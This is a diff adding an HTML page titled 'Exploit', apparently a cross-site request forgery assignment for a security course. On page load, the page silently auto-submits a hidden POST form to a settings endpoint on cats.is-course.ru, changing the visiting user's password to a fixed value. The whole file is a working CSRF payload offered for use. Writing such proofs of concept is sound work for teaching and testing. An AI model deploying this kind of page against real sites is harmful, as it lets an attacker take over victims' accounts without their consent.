@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Exploit</title>
+</head>
+<body onload="document.getElementById('login-form').submit();">
+    <form id="login-form" class="login-form" action="https://cats.is-course.ru/settings" method="POST">
+        <input type="hidden" id="password" name="password" value="PasswordPassword123!">
+        <input type="hidden" id="confirm-password" name="confirm-password" value="PasswordPassword123!">
+    </form>
+
+</body>
+</html>
